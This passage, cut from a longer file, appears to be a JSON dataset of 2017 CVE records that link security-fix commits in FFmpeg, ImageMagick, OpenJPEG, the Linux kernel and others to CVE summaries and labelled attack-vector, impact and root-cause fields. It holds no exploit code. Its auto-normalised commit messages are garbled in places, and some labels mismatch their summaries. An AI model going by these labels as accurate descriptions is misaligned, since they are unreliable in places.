that the file is supposed to be treated as a .desktop file, and then remember the user's answer in the metadata::trusted field.","commit_message_1":"use file metadata for trusting desktop file currently we only trust desktop file that have the executable bit set , and do n't replace the displayed icon or the displayed name until it 's trusted , which prevents for running random program by a malicious desktop file","Vulnerability Type":"Improper Input Validation","Attack Vector":"By using the .desktop file extension","Impact":"conduct spoofing attacks","Root Cause":"caused by improper validation of user supplied request","Attack Type":"remote attacker"},{"commit_id":"5562545b5562f6d12a4ef991fae158bf4ccf92b6","cve_id":"CVE-2017-14502","cwe_id":"CWE-125","commit_message":"Avoid a read off-by-one error for UTF16 names in RAR archives.\n\nReported-By: OSS-Fuzz issue 573","summary":"read_header in archive_read_support_format_rar.c in libarchive 3.3.2 suffers from an off-by-one error for UTF-16 names in RAR archives, leading to an out-of-bounds read in archive_read_format_rar_read_header.","commit_message_1":"avoid a read off-by-one error for utf16 name in rar archive","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially-crafted RAR file","Impact":"buffer overflow","Root Cause":"caused by improper bounds checking by the read_header function","Attack Type":"remote attacker"},{"commit_id":"c8fea2f60c18ed30bdd1bb6f798e994e51a58260","cve_id":"CVE-2017-14500","cwe_id":"CWE-78","commit_message":"Work around shell code in podcast names (#598)","summary":"Improper Neutralization of Special Elements used in an OS Command in the podcast playback function of Podbeuter in Newsbeuter 0.3 through 2.9 allows remote attackers to perform user-assisted code execution by crafting an RSS item with a media enclosure (i.e., a podcast file) that includes shell metacharacters in its filename, related to pb_controller.cpp and queueloader.cpp, a different vulnerability than CVE-2017-12904.","commit_message_1":"work around shell code in podcast name ( # <number> )","Vulnerability Type":"command injection","Attack Vector":"By using a specially-crafted RSS item","Impact":"execute arbitrary code","Root Cause":"caused by improper Neutralization of Special Elements used","Attack Type":"remote attacker"},{"commit_id":"edbd58be15a957f6a760c4a514cd475217eb97fd","cve_id":"CVE-2017-14497","cwe_id":"CWE-119","commit_message":"packet: Don't write vnet header beyond end of buffer\n\n... which may happen with certain values of tp_reserve and maclen.\n\nFixes: 58d19b19cd99 (\"packet: vnet_hdr support for tpacket_rcv\")\nSigned-off-by: Benjamin Poirier <bpoirier@suse.com>\nCc: Willem de Bruijn <willemb@google.com>\nAcked-by: Willem de Bruijn <willemb@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The tpacket_rcv function in net\/packet\/af_packet.c in the Linux kernel before 4.13 mishandles vnet headers, which might allow local users to cause a denial of service (buffer overflow, and disk and memory corruption) or possibly have unspecified other impact via crafted system calls.","commit_message_1":"do n't write vnet header beyond end of buffer","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted system calls","Impact":"cause a denial of service ( buffer overflow , and disk and memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by the improper handling of vnet headers issue","Attack Type":"local attacker"},{"commit_id":"4eae304e773bad8a876c3c26fdffac24d4253ae4","cve_id":"CVE-2017-14341","cwe_id":"CWE-400","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/654","summary":"ImageMagick 7.0.6-6 has a large loop vulnerability in ReadWPGImage in coders\/wpg.c, causing CPU exhaustion via a crafted wpg image file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Uncontrolled Resource Consumption","Attack Vector":"By persuading a victim to open a specially-crafted wpg image file","Impact":"cause a denial of service","Root Cause":"caused by a large loop flaw","Attack Type":"remote attacker"},{"commit_id":"6bd33275368edfa71ae117de895488584678ac79","cve_id":"CVE-2017-14230","cwe_id":"CWE-20","commit_message":"mboxlist: fix uninitialised memory use where pattern is \"Other Users\"","summary":"In the mboxlist_do_find function in imap\/mboxlist.c in Cyrus IMAP before 3.0.4, an off-by-one error in prefix calculation for the LIST command caused use of uninitialized memory, which might allow remote attackers to obtain sensitive information or cause a denial of service (daemon crash) via a 'LIST ** *Other Users*' command.","commit_message_1":"fix uninitialised memory use where pattern is `` other user ''","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a ' list * * * other users * ' command","Impact":"obtain sensitive information or cause a denial of service ( daemon crash )","Root Cause":"caused by an off-by-one error mboxlist_do_find function","Attack Type":"remote attacker"},{"commit_id":"837cb4325b712ff1aab531bf41668933f61d75d2","cve_id":"CVE-2017-14225","cwe_id":"CWE-476","commit_message":"ffprobe: Fix null pointer dereference with color primaries\n\nFound-by: AD-lab of venustech\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"The av_color_primaries_name function in libavutil\/pixdesc.c in FFmpeg 3.3.3 may return a NULL pointer depending on a value contained in a file, but callers do not anticipate this, as demonstrated by the avcodec_string function in libavcodec\/utils.c, leading to a NULL pointer dereference. (It is also conceivable that there is security relevance for a NULL pointer dereference in av_color_primaries_name calls within the ffprobe command-line program.)","commit_message_1":"ffprobe : fix null pointer dereference with color primary","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By using a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"afc9c683ed9db01edb357bc8c19edad4282b3a97","cve_id":"CVE-2017-14223","cwe_id":"CWE-399","commit_message":"avformat\/asfdec: Fix DoS in asf_build_simple_index()\n\nFixes: Missing EOF check in loop\nNo testcase\n\nFound-by: Xiaohei and Wangchu from Alibaba Security Team\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"In libavformat\/asfdec_f.c in FFmpeg 3.3.3, a DoS in asf_build_simple_index() due to lack of an EOF (End of File) check might cause huge CPU consumption. When a crafted ASF file, which claims a large *ict* field in the header but does not contain sufficient backing data, is provided, the for loop would consume huge CPU and memory resources, since there is no EOF check inside the loop.","commit_message_1":"avformat\/asfdec : fix do in asf_build_simple_index ( )","Vulnerability Type":"Resource Management Errors","Attack Vector":"By using a specially-crafted ASF file","Impact":"cause a denial of service","Root Cause":"caused by the lack of an EOF (End of File) check","Attack Type":"remote attacker"},{"commit_id":"9cb4eb772839c5e1de2855d126bf74ff16d13382","cve_id":"CVE-2017-14222","cwe_id":"CWE-834","commit_message":"avformat\/mov: Fix DoS in read_tfra()\n\nFixes: Missing EOF check in loop\nNo testcase\n\nFound-by: Xiaohei and Wangchu from Alibaba Security Team\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"In libavformat\/mov.c in FFmpeg 3.3.3, a DoS in read_tfra() due to lack of an EOF (End of File) check might cause huge CPU and memory consumption. When a crafted MOV file, which claims a large *item_count* field in the header but does not contain sufficient backing data, is provided, the loop would consume huge CPU and memory resources, since there is no EOF check inside the loop.","commit_message_1":"avformat\/mov : fix do in read_tfra ( )","Vulnerability Type":"Excessive Iteration","Attack Vector":"By using a specially-crafted MOV file","Impact":"cause a denial of service","Root Cause":"caused by the lack of an EOF (End of File) check","Attack Type":"remote attacker"},{"commit_id":"b8c63b156bf26b52e710b1a0643c846a6cd01e56","cve_id":"CVE-2017-14175","cwe_id":"CWE-834","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/712","summary":"In coders\/xbm.c in ImageMagick 7.0.6-1 Q16, a DoS in ReadXBMImage() due to lack of an EOF (End of File) check might cause huge CPU consumption. When a crafted XBM file, which claims large rows and columns fields in the header but does not contain sufficient backing data, is provided, the loop over the rows would consume huge CPU resources, since there is no EOF check inside the loop.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Excessive Iteration","Attack Vector":"By persuading a victim to open a specially crafted file","Impact":"cause a denial of service","Root Cause":"caused by the lack of an EOF (End of File) check","Attack Type":"remote attacker"},{"commit_id":"f68a98a9d385838a1c73ec960a14102949940a64","cve_id":"CVE-2017-14174","cwe_id":"CWE-834","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/714","summary":"In coders\/psd.c in ImageMagick 7.0.7-0 Q16, a DoS in ReadPSDLayersInternal() due to lack of an EOF (End of File) check might cause huge CPU consumption. When a crafted PSD file, which claims a large *length* field in the header but does not contain sufficient backing data, is provided, the loop over *length* would consume huge CPU resources, since there is no EOF check inside the loop.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Excessive Iteration","Attack Vector":"By persuading a victim to open a specially crafted file","Impact":"cause a denial of service","Root Cause":"caused by the lack of an EOF (End of File) check","Attack Type":"remote attacker"},{"commit_id":"48bcf7c39302cdf9b0d9202ad03bf1b95152c44d","cve_id":"CVE-2017-14173","cwe_id":"CWE-190","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/713","summary":"In the function ReadTXTImage() in coders\/txt.c in ImageMagick 7.0.6-10, an integer overflow might occur for the addition operation *GetQuantumRange(depth)+1* when *depth* is large, producing a smaller value than expected. As a result, an infinite loop would occur for a crafted TXT file that claims a very large *max_value* value.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"integer overflow","Attack Vector":"By persuading a victim to open a specially crafted file","Impact":"cause a denial of service ( integer overflow and infinite loop )","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"8598a497e2d1f556a34458cf54b40ba40674734c","cve_id":"CVE-2017-14172","cwe_id":"CWE-834","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/715","summary":"In coders\/ps.c in ImageMagick 7.0.7-0 Q16, a DoS in ReadPSImage() due to lack of an EOF (End of File) check might cause huge CPU consumption. When a crafted PSD file, which claims a large *extent* field in the header but does not contain sufficient backing data, is provided, the loop over *length* would consume huge CPU resources, since there is no EOF check inside the loop.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Excessive Iteration","Attack Vector":"By persuading a victim to open a specially crafted file","Impact":"cause a denial of service","Root Cause":"caused by the lack of an EOF (End of File) check","Attack Type":"remote attacker"},{"commit_id":"c24bcb553650b91e9eff15ef6e54ca73de2453b7","cve_id":"CVE-2017-14171","cwe_id":"CWE-834","commit_message":"avformat\/nsvdec: Fix DoS due to lack of eof check in nsvs_file_offset loop.\n\nFixes: 20170829.nsv\n\nCo-Author: \u5f20\u6d2a\u4eae(\u671b\u521d)\" <wangchu.zhl@alibaba-inc.com>\nFound-by: Xiaohei and Wangchu from Alibaba Security Team\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"In libavformat\/nsvdec.c in FFmpeg 3.3.3, a DoS in nsv_parse_NSVf_header() due to lack of an EOF (End of File) check might cause huge CPU consumption. When a crafted NSV file, which claims a large *table_entries_used* field in the header but does not contain sufficient backing data, is provided, the loop over 'table_entries_used' would consume huge CPU resources, since there is no EOF check inside the loop.","commit_message_1":"fix do due to lack of eof check in nsvs_file_offset loop","Vulnerability Type":"Excessive Iteration","Attack Vector":"By persuading a victim to open a specially crafted file","Impact":"cause a denial of service","Root Cause":"caused by the lack of an EOF (End of File) check","Attack Type":"remote attacker"},{"commit_id":"900f39692ca0337a98a7cf047e4e2611071810c2","cve_id":"CVE-2017-14170","cwe_id":"CWE-834","commit_message":"avformat\/mxfdec: Fix DoS issues in mxf_read_index_entry_array()\n\nFixes: 20170829A.mxf\n\nCo-Author: \u5f20\u6d2a\u4eae(\u671b\u521d)\" <wangchu.zhl@alibaba-inc.com>\nFound-by: Xiaohei and Wangchu from Alibaba Security Team\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"In libavformat\/mxfdec.c in FFmpeg 3.3.3, a DoS in mxf_read_index_entry_array() due to lack of an EOF (End of File) check might cause huge CPU consumption. When a crafted MXF file, which claims a large *nb_index_entries* field in the header but does not contain sufficient backing data, is provided, the loop would consume huge CPU resources, since there is no EOF check inside the loop. Moreover, this big loop can be invoked multiple times if there is more than one applicable data segment in the crafted MXF file.","commit_message_1":"avformat\/mxfdec : fix do issue in mxf_read_index_entry_array ( )","Vulnerability Type":"Excessive Iteration","Attack Vector":"By persuading a victim to open a specially crafted file","Impact":"cause a denial of service","Root Cause":"caused by the lack of an EOF (End of File) check","Attack Type":"remote attacker"},{"commit_id":"9d00fb9d70ee8c0cc7002b89318c5be00f1bbdad","cve_id":"CVE-2017-14169","cwe_id":"CWE-20","commit_message":"avformat\/mxfdec: Fix Sign error in mxf_read_primer_pack()\n\nFixes: 20170829B.mxf\n\nCo-Author: \u5f20\u6d2a\u4eae(\u671b\u521d)\" <wangchu.zhl@alibaba-inc.com>\nFound-by: Xiaohei and Wangchu from Alibaba Security Team\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"In the mxf_read_primer_pack function in libavformat\/mxfdec.c in FFmpeg 3.3.3, an integer signedness error might occur when a crafted file, which claims a large *item_num* field such as 0xffffffff, is provided. As a result, the variable *item_num* turns negative, bypassing the check for a large value.","commit_message_1":"avformat\/mxfdec : fix sign error in mxf_read_primer_pack ( )","Vulnerability Type":"Improper Input Validation","Attack Vector":"By sending a specially-crafted request","Impact":"bypass security restrictions","Root Cause":"caused by an integer signedness error","Attack Type":"remote attacker"},{"commit_id":"fa7438a0ff4033e4741c807394a9af6207940d71","cve_id":"CVE-2017-14166","cwe_id":"CWE-125","commit_message":"Do something sensible for empty strings to make fuzzers happy.","summary":"libarchive 3.3.2 allows remote attackers to cause a denial of service (xml_data heap-based buffer over-read and application crash) via a crafted xar archive, related to the mishandling of empty strings in the atol8 function in archive_read_support_format_xar.c.","commit_message_1":"do something sensible for empty string to make fuzzers happy","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted xar archive , related to the mishandling of empty strings in the atol8 function in archive _ read _ support _ format _ xar . c","Impact":"cause a denial of service ( xml _ data heap - based buffer over - read and application crash )","Root Cause":"caused by a xml_data heap-based buffer over-read issue","Attack Type":"remote attacker"},{"commit_id":"dcac91b8c72f743bda7dbfa9032356bc8110098a","cve_id":"CVE-2017-14164","cwe_id":"CWE-787","commit_message":"opj_j2k_write_sot(): fix potential write heap buffer overflow (#991)","summary":"A size-validation issue was discovered in opj_j2k_write_sot in lib\/openjp2\/j2k.c in OpenJPEG 2.2.0. The vulnerability causes an out-of-bounds write, which may lead to remote denial of service (heap-based buffer overflow affecting opj_write_bytes_LE in lib\/openjp2\/cio.c) or possibly remote code execution. NOTE: this vulnerability exists because of an incomplete fix for CVE-2017-14152.","commit_message_1":"opj_j2k_write_sot ( ) : fix potential write heap buffer overflow ( # <number> )","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a size-validation issue","Attack Type":"remote attacker"},{"commit_id":"4241ae6fbbf1de9658764a80944dc8108f2b4154","cve_id":"CVE-2017-14152","cwe_id":"CWE-787","commit_message":"Fix assertion in debug mode \/ heap-based buffer overflow in opj_write_bytes_LE for Cinema profiles with numresolutions = 1 (#985)","summary":"A mishandled zero case was discovered in opj_j2k_set_cinema_parameters in lib\/openjp2\/j2k.c in OpenJPEG 2.2.0. The vulnerability causes an out-of-bounds write, which may lead to remote denial of service (heap-based buffer overflow affecting opj_write_bytes_LE in lib\/openjp2\/cio.c and opj_j2k_write_sot in lib\/openjp2\/j2k.c) or possibly remote code execution.","commit_message_1":"fix assertion in debug mode \/ heap-based buffer overflow in opj_write_bytes_le for cinema profile with numresolutions = <number> ( # <number> )","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"execute arbitrary code on the system or cause the application to crash","Root Cause":"caused by improper bounds checking by opj_write_bytes_LE","Attack Type":"remote attacker"},{"commit_id":"afb308b9ccbe129608c9205cf3bb39bbefad90b9","cve_id":"CVE-2017-14151","cwe_id":"CWE-119","commit_message":"Encoder: grow buffer size in opj_tcd_code_block_enc_allocate_data() to avoid write heap buffer overflow in opj_mqc_flush (#982)","summary":"An off-by-one error was discovered in opj_tcd_code_block_enc_allocate_data in lib\/openjp2\/tcd.c in OpenJPEG 2.2.0. The vulnerability causes an out-of-bounds write, which may lead to remote denial of service (heap-based buffer overflow affecting opj_mqc_flush in lib\/openjp2\/mqc.c and opj_t1_encode_cblk in lib\/openjp2\/t1.c) or possibly remote code execution.","commit_message_1":"grow buffer size in opj_tcd_code_block_enc_allocate_data ( ) to avoid write heap buffer overflow in opj_mqc_flush ( # <number> )","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"overflow a buffer and possibly execute arbitrary code","Root Cause":"caused by improper bounds checking by opj_mqc_flush","Attack Type":"remote attacker"},{"commit_id":"197e7e521384a23b9e585178f3f11c9fa08274b9","cve_id":"CVE-2017-14140","cwe_id":"CWE-200","commit_message":"Sanitize 'move_pages()' permission checks\n\nThe 'move_paghes()' system call was introduced long long ago with the\nsame permission checks as for sending a signal (except using\nCAP_SYS_NICE instead of CAP_SYS_KILL for the overriding capability).\n\nThat turns out to not be a great choice - while the system call really\nonly moves physical page allocations around (and you need other\ncapabilities to do a lot of it), you can check the return value to map\nout some the virtual address choices and defeat ASLR of a binary that\nstill shares your uid.\n\nSo change the access checks to the more common 'ptrace_may_access()'\nmodel instead.\n\nThis tightens the access checks for the uid, and also effectively\nchanges the CAP_SYS_NICE check to CAP_SYS_PTRACE, but it's unlikely that\nanybody really _uses_ this legacy system call any more (we hav ebetter\nNUMA placement models these days), so I expect nobody to notice.\n\nFamous last words.\n\nReported-by: Otto Ebeling <otto.ebeling@iki.fi>\nAcked-by: Eric W. Biederman <ebiederm@xmission.com>\nCc: Willy Tarreau <w@1wt.eu>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The move_pages system call in mm\/migrate.c in the Linux kernel before 4.12.9 doesn't check the effective uid of the target process, enabling a local attacker to learn the memory layout of a setuid executable despite ASLR.","commit_message_1":"sanitize 'move_pages ( ) ' permission check the 'move_paghes ( ) ' system call wa introduced long long ago with the same permission check a for sending a signal ( except using cap_sys_nice instead of cap_sys_kill for the overriding capability )","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"By sending a specially-crafted request","Impact":"learn the memory layout of a setuid executable despite aslr","Root Cause":"doesn ' t check the effective uid of the target process","Attack Type":"attacker"},{"commit_id":"9b46957ec98d85a572e9ef98301247f39338a3b5","cve_id":"CVE-2017-14107","cwe_id":"CWE-119","commit_message":"Make eocd checks more consistent between zip and zip64 cases.","summary":"The _zip_read_eocd64 function in zip_open.c in libzip before 1.3.0 mishandles EOCD records, which allows remote attackers to cause a denial of service (memory allocation failure in _zip_cdir_grow in zip_dirent.c) via a crafted ZIP archive.","commit_message_1":"make eocd check more consistent between zip and zip64 case","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted zip archive","Impact":"cause a denial of service ( memory allocation failure in _ zip _ cdir _ grow in zip _ dirent . c )","Root Cause":"caused by the improper handling of EOCD records","Attack Type":"remote attacker"},{"commit_id":"499350a5a6e7512d9ed369ed63a4244b6536f4f8","cve_id":"CVE-2017-14106","cwe_id":"CWE-369","commit_message":"tcp: initialize rcv_mss to TCP_MIN_MSS instead of 0\n\nWhen tcp_disconnect() is called, inet_csk_delack_init() sets\nicsk->icsk_ack.rcv_mss to 0.\nThis could potentially cause tcp_recvmsg() => tcp_cleanup_rbuf() =>\n__tcp_select_window() call path to have division by 0 issue.\nSo this patch initializes rcv_mss to TCP_MIN_MSS instead of 0.\n\nReported-by: Andrey Konovalov  <andreyknvl@google.com>\nSigned-off-by: Wei Wang <weiwan@google.com>\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nSigned-off-by: Neal Cardwell <ncardwell@google.com>\nSigned-off-by: Yuchung Cheng <ycheng@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The tcp_disconnect function in net\/ipv4\/tcp.c in the Linux kernel before 4.12 allows local users to cause a denial of service (__tcp_select_window divide-by-zero error and system crash) by triggering a disconnect within a certain tcp_recvmsg code path.","commit_message_1":"initialize rcv_mss to tcp_min_mss instead of <number> when tcp_disconnect ( ) is called , inet_csk_delack_init ( ) set icsk- > <file> to <number>","Vulnerability Type":"Divide By Zero","Attack Vector":"by triggering a disconnect within a certain tcp _ recvmsg code path","Impact":"cause a denial of service ( _ _ tcp _ select _ window divide - by - zero error and system crash )","Root Cause":"caused by a divide-by-zero flaw","Attack Type":"local attacker"},{"commit_id":"7e80b63ecd259d69d383623e75b318bf2bd491f6","cve_id":"CVE-2017-14059","cwe_id":"CWE-834","commit_message":"avformat\/cinedec: Fix DoS due to lack of eof check\n\nFixes: loop.cine\n\nFound-by: Xiaohei and Wangchu from Alibaba Security Team\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"In FFmpeg 3.3.3, a DoS in cine_read_header() due to lack of an EOF check might cause huge CPU and memory consumption. When a crafted CINE file, which claims a large *duration* field in the header but does not contain sufficient backing data, is provided, the image-offset parsing loop would consume huge CPU and memory resources, since there is no EOF check inside the loop.","commit_message_1":"avformat\/cinedec : fix do due to lack of eof check","Vulnerability Type":"Excessive Iteration","Attack Vector":"By persuading a victim to open a specially crafted file","Impact":"cause a denial of service","Root Cause":"caused by the lack of an EOF (End of File) check","Attack Type":"remote attacker"},{"commit_id":"7ec414892ddcad88313848494b6fc5f437c9ca4a","cve_id":"CVE-2017-14058","cwe_id":"CWE-835","commit_message":"avformat\/hls: Fix DoS due to infinite loop\n\nFixes: loop.m3u\n\nThe default max iteration count of 1000 is arbitrary and ideas for a better solution are welcome\n\nFound-by: Xiaohei and Wangchu from Alibaba Security Team\n\nPrevious version reviewed-by: Steven Liu <lingjiujianke@gmail.com>\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"In FFmpeg 3.3.3, the read_data function in libavformat\/hls.c does not restrict reload attempts for an insufficient list, which allows remote attackers to cause a denial of service (infinite loop).","commit_message_1":"fix do due to infinite loop the default max iteration count of <number> is arbitrary and idea for a better solution are welcome previous version reviewed-by : steven liu < lingjiujianke @ <file> >","Vulnerability Type":"Infinite Loop","Attack Vector":"By sending a specially crafted request","Impact":"cause a denial of service","Root Cause":"does not restrict reload attempts for an insufficient list ,","Attack Type":"remote attacker"},{"commit_id":"7f9ec5593e04827249e7aeb466da06a98a0d7329","cve_id":"CVE-2017-14057","cwe_id":"CWE-834","commit_message":"avformat\/asfdec: Fix DoS due to lack of eof check\n\nFixes: loop.asf\n\nFound-by: Xiaohei and Wangchu from Alibaba Security Team\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"In FFmpeg 3.3.3, a DoS in asf_read_marker() due to lack of an EOF (End of File) check might cause huge CPU and memory consumption. When a crafted ASF file, which claims a large *name_len* or *count* field in the header but does not contain sufficient backing data, is provided, the loops over the name and markers would consume huge CPU and memory resources, since there is no EOF check inside these loops.","commit_message_1":"avformat\/asfdec : fix do due to lack of eof check","Vulnerability Type":"Excessive Iteration","Attack Vector":"By persuading a victim to open a specially crafted file","Impact":"cause a denial of service","Root Cause":"caused by the lack of an EOF (End of File) check","Attack Type":"remote attacker"},{"commit_id":"96f24d1bee7fe7bac08e2b7c74db1a046c9dc0de","cve_id":"CVE-2017-14056","cwe_id":"CWE-834","commit_message":"avformat\/rl2: Fix DoS due to lack of eof check\n\nFixes: loop.rl2\n\nFound-by: Xiaohei and Wangchu from Alibaba Security Team\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"In libavformat\/rl2.c in FFmpeg 3.3.3, a DoS in rl2_read_header() due to lack of an EOF (End of File) check might cause huge CPU and memory consumption. When a crafted RL2 file, which claims a large *frame_count* field in the header but does not contain sufficient backing data, is provided, the loops (for offset and size tables) would consume huge CPU and memory resources, since there is no EOF check inside these loops.","commit_message_1":"avformat\/rl2 : fix do due to lack of eof check","Vulnerability Type":"Excessive Iteration","Attack Vector":"By persuading a victim to open a specially crafted file","Impact":"cause a denial of service","Root Cause":"caused by the lack of an EOF (End of File) check","Attack Type":"remote attacker"},{"commit_id":"4f05e2e2dc1a89f38cd9f0960a6561083d714f1e","cve_id":"CVE-2017-14055","cwe_id":"CWE-834","commit_message":"avformat\/mvdec: Fix DoS due to lack of eof check\n\nFixes: loop.mv\n\nFound-by: Xiaohei and Wangchu from Alibaba Security Team\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"In libavformat\/mvdec.c in FFmpeg 3.3.3, a DoS in mv_read_header() due to lack of an EOF (End of File) check might cause huge CPU and memory consumption. When a crafted MV file, which claims a large *nb_frames* field in the header but does not contain sufficient backing data, is provided, the loop over the frames would consume huge CPU and memory resources, since there is no EOF check inside the loop.","commit_message_1":"avformat\/mvdec : fix do due to lack of eof check","Vulnerability Type":"Excessive Iteration","Attack Vector":"By persuading a victim to open a specially crafted file","Impact":"cause a denial of service","Root Cause":"caused by the lack of an EOF (End of File) check","Attack Type":"remote attacker"},{"commit_id":"124eb202e70678539544f6268efc98131f19fa49","cve_id":"CVE-2017-14054","cwe_id":"CWE-834","commit_message":"avformat\/rmdec: Fix DoS due to lack of eof check\n\nFixes: loop.ivr\n\nFound-by: Xiaohei and Wangchu from Alibaba Security Team\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"In libavformat\/rmdec.c in FFmpeg 3.3.3, a DoS in ivr_read_header() due to lack of an EOF (End of File) check might cause huge CPU consumption. When a crafted IVR file, which claims a large *len* field in the header but does not contain sufficient backing data, is provided, the first type==4 loop would consume huge CPU resources, since there is no EOF check inside the loop.","commit_message_1":"avformat\/rmdec : fix do due to lack of eof check","Vulnerability Type":"Excessive Iteration","Attack Vector":"By persuading a victim to open a specially crafted file","Impact":"cause a denial of service","Root Cause":"caused by the lack of an EOF (End of File) check","Attack Type":"remote attacker"},{"commit_id":"e5285319229a5d77bf316bb0d3a6cbd3cb8666d9","cve_id":"CVE-2017-14041","cwe_id":"CWE-787","commit_message":"pgxtoimage(): fix write stack buffer overflow (#997)","summary":"A stack-based buffer overflow was discovered in the pgxtoimage function in bin\/jp2\/convert.c in OpenJPEG 2.2.0. The vulnerability causes an out-of-bounds write, which may lead to remote denial of service or possibly remote code execution.","commit_message_1":"pgxtoimage ( ) : fix write stack buffer overflow ( # <number> )","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"execute arbitrary code on the system or cause a denial of service","Root Cause":"caused by improper bounds checking by the pgxtoimage function","Attack Type":"remote attacker"},{"commit_id":"2cd30c2b06ce332dede81cccad8b334cde997281","cve_id":"CVE-2017-14040","cwe_id":"CWE-787","commit_message":"tgatoimage(): avoid excessive memory allocation attempt, and fixes unaligned load (#995)","summary":"An invalid write access was discovered in bin\/jp2\/convert.c in OpenJPEG 2.2.0, triggering a crash in the tgatoimage function. The vulnerability may lead to remote denial of service or possibly unspecified other impact.","commit_message_1":"avoid excessive memory allocation attempt , and fix unaligned load ( # <number> )","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by invalid write","Attack Type":"remote attacker"},{"commit_id":"c535531f03369623b9b833ef41952c62257b507e","cve_id":"CVE-2017-14039","cwe_id":"CWE-787","commit_message":"opj_t2_encode_packet(): fix potential write heap buffer overflow (#992)","summary":"A heap-based buffer overflow was discovered in the opj_t2_encode_packet function in lib\/openjp2\/t2.c in OpenJPEG 2.2.0. The vulnerability causes an out-of-bounds write, which may lead to remote denial of service or possibly unspecified other impact.","commit_message_1":"opj_t2_encode_packet ( ) : fix potential write heap buffer overflow ( # <number> )","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by improper bounds checking by the opj_t2_encode_packet function","Attack Type":"remote attacker"},{"commit_id":"d15795acd5074e0b44e71f7ede8bdfe1b48591fc","cve_id":"CVE-2017-14032","cwe_id":"CWE-287","commit_message":"Improve behaviour on fatal errors\n\nIf we didn't walk the whole chain, then there may be any kind of errors in the\npart of the chain we didn't check, so setting all flags looks like the safe\nthing to do.","summary":"ARM mbed TLS before 1.3.21 and 2.x before 2.1.9, if optional authentication is configured, allows remote attackers to bypass peer authentication via an X.509 certificate chain with many intermediates. NOTE: although mbed TLS was formerly known as PolarSSL, the releases shipped with the PolarSSL name are not affected.","commit_message_1":"improve behaviour on fatal error if we did n't walk the whole chain , then there may be any kind of error in the part of the chain we did n't check , so setting all flag look like the safe thing to do","Vulnerability Type":"Improper Authentication","Attack Vector":"By using an X.509 certificate chain with many intermediates","Impact":"bypass security restrictions","Root Cause":"caused by a flaw when authenticating via optional authentication configuration","Attack Type":"remote attacker"},{"commit_id":"a6e544b0a88b53114bfa5a57e21b7be7a8dfc9d0","cve_id":"CVE-2017-13715","cwe_id":"CWE-20","commit_message":"flow_dissector: Jump to exit code in __skb_flow_dissect\n\nInstead of returning immediately (on a parsing failure for instance) we\njump to cleanup code. This always sets protocol values in key_control\n(even on a failure there is still valid information in the key_tags that\nwas set before the problem was hit).\n\nSigned-off-by: Tom Herbert <tom@herbertland.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The __skb_flow_dissect function in net\/core\/flow_dissector.c in the Linux kernel before 4.3 does not ensure that n_proto, ip_proto, and thoff are initialized, which allows remote attackers to cause a denial of service (system crash) or possibly execute arbitrary code via a single crafted MPLS packet.","commit_message_1":"jump to exit code in __skb_flow_dissect instead of returning immediately ( on a parsing failure for instance ) we jump to cleanup code","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a single crafted mpls packet","Impact":"cause a denial of service ( system crash ) or possibly execute arbitrary code","Root Cause":"does not ensure that n _ proto , ip _ proto , and thoff are initialized","Attack Type":"remote 